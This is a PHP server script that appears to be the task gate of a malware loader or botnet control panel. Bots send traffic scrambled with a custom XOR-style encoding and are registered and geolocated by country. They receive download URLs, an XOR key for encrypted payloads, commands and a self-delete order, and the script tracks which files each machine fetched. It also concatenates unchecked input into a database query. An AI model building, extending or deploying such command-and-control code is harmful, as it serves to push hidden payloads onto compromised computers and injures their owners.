<?php

    require_once( __DIR__ ."/../init.php" );
    require_once( __DIR__ . "/../core/geoip.inc" );
    
    function encode( $src ) { 
        $dest = ''; 
        for ( $n = 0; $n < strlen( $src ); $n++ ) { 
            $input = ord( $src[ $n ] ); 
            $A = $input >> 4; 
            $F = $B = $input&0x0F; 
            $E = mt_rand( 3, 7 ); 
            $D = $A^$E; 
            $C = mt_rand( 3,7 ); 
            $dest .= chr( $C*16 + $D ).chr( $E*16 + $F ); 
        } 
        return $dest.'A'; 
    } 

    function decode( $src ) { 
        $ret = ''; 
        for ( $n = 1; $n < strlen( $src ); $n += 2) { 
            $input = ord( $src[ $n ] ); 
            $F = $input & 0x0F; 
            $E = $input >> 4; 
            $D = ord( $src[ $n-1] ) & 0x0F; 
            $ret .= chr( ( $D^$E )*16 + $F ); 
        } 
        return $ret; 
    } 

    
    // check for POST and 'data' in POST
    if ( $_SERVER['REQUEST_METHOD'] != 'POST' )
        ErrorReturn("GET doesn't support");
    
    $data = file_get_contents("php://input");
        
    if( ! isset( $data ) || count( $data ) == 0  )
        ErrorReturn("no data");
    
    try {
        $post_data = json_decode( decode( $data ) );
        
    } catch (Exception $e ) {
        ErrorReturn( "data decoding failed" );
    }
    
    if( !isset( $post_data->ID1 ) )
        ErrorReturn("ID1 required");
        
    if( !isset( $post_data->type ) )
        ErrorReturn("type required");
        
    if( !isset( $post_data->ID4 ) )
        ErrorReturn("ID4 required");    
    
    // get OS version
    foreach ( array(1,2,4,5,6,7) as $key ){
        $post_data->ID4[ $key ] = 0;
    }
    $os = $OSModel->getOSByNumber( $post_data->ID4 );
    
    if( count( $os ) == 0 )
        ErrorReturn("no sush OS in the database");
    
    $os = $os[0]['id'];    
    
    // get client from database
    $clients = $ClientModel->getClientByID( $post_data->ID1 );
    
    if ( count( $clients ) == 0 ) {
        $ClientModel->addClient( $post_data->ID1, $post_data->ID2, $os );
        $clients = $ClientModel->getClientByID( $post_data->ID1 );
    }
    
    $client = $clients[0];
    
    // get user country id
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    // get Country ID
    $country_id = 0;
    $gi = geoip_open( GEOIP_DAT, GEOIP_STANDARD );    
    $country_name = geoip_country_name_by_addr( $gi, $ip );
    geoip_close($gi);
    
    if( $country_name && count( $country_name ) > 0 ) {
        $country_result = $CountryModel->getCountryByName( $country_name );        
        if( count( $country_result ) > 0 )
            $country_id = $country_result[0]['id'];
        else
            $country_id = $CountryModel->addCountry( $country_name );
    }
    
    // register request
    $requests = $RequestModel->getRequestsOrdered( $client['id'] );
    if( count( $requests ) == 0 )
        $RequestModel->addRequest( $client['id'], $PING_TIME, $country_id, $os );
    else {
        if( $requests[0]['request_date'] > date('Y-m-d H:i:s', strtotime('today midnight') ) ) 
            $RequestModel->updateRequest( $requests[0]['id'], $PING_TIME, $country_id, $os );
        else
            $RequestModel->addRequest( $client['id'], $PING_TIME, $country_id, $os );    
    }    
    
    // check for accept
    if( isset( $post_data->Accepte ) ) {
        $task_id = $post_data->Accepte;
        $tasks = $TaskModel->getAllTask( "id=" . $task_id );
        
        if( count( $tasks ) != 0 ) {
            $status = 0;
            if( isset( $post_data->Completed1 ) && isset( $post_data->Completed2 ) ) {
                    
                $files = $TaskFileModel->getFilesForTask( $task_id );
                
                if( count( $files ) != 0 ) {
                    
                    $col_result = 1;

                    foreach( $files as $file ){
                        $row_result = 0;    
                        foreach( $post_data->Completed2 as $temp_file ){
                            if( substr( $temp_file, 3 ) == $file['file_id'] ) {
                                $row_result = 1;
                                $FileStatusModel->addStatus( $file['id'], $task_id, $client['id'], 1 );
                                break;
                            }
                        }
                        if ( $row_result != 1 ){
                            $col_result = 0;
                            $FileStatusModel->addStatus( $file['id'], $task_id, $client['id'], 0 );
                            //break;
                        }
                    }
                    
                    if( $col_result == 1)
                        $status = 1;
                    else{
                        $status = 2;
                    }
                }

            }        
            
            $TaskStatusModel->removeStatuses( $task_id, $client['id'] );
            $TaskStatusModel->addStatus( $task_id, $client['id'], $status );
        }
    }
    
    // make a response
    $response_data = array(
        "result"=> "DONE", 
        "ping"=> $PING_TIME,
    );
        
    if( $post_data->type == 'getjob' ) {    
                    
        // get new active tasks from database
        $tasks = $TaskModel->getTaskForClient( $client['id'], $post_data->ID2, $country_id );
        
        if ( count( $tasks ) == 0 ) {
            $response_data['task'] = 'NOTASKS';    
        } else {
            foreach( $tasks as $task ){
                $response_data['task'] = $task['id'];
            }
            
            //add given time
            $TaskModel->addGivenTime( $task['id'] );
            
            // get task files
            $task_files = $TaskFileModel->getFilesForTask( $response_data['task'] );
            
            $response_data['add'] = array();
            
            $view_xor_key = false;
            
            foreach( $task_files as $task_file ){
                if ( filter_var( $task_file['file_path'], FILTER_VALIDATE_URL ) ) { 
                    $response_data['add'][ 'url' . $task_file['file_id'] ] = $task_file['file_path'];
                } else {                    
                    $response_data['add'][ 'url' . $task_file['file_id'] ] = FILES_URL . $task_file['file_path'];
                }
                
                if( $task_file['encrypted'] )
                    $view_xor_key = true;
            }
            
            // set key
            if ( $view_xor_key )            
                $response_data['key'] = XOR_KEY;
            
            // set task command            
            $response_data['command'] = $COMMAND;
                    
            if( $task['delete_after_finish'] )
                if( $task['delete_after_finish'] == 1 )
                    $response_data['command'] = "DEL";

        }        

        print_r( encode( json_encode( $response_data ) ) );
        exit();
    }
?>

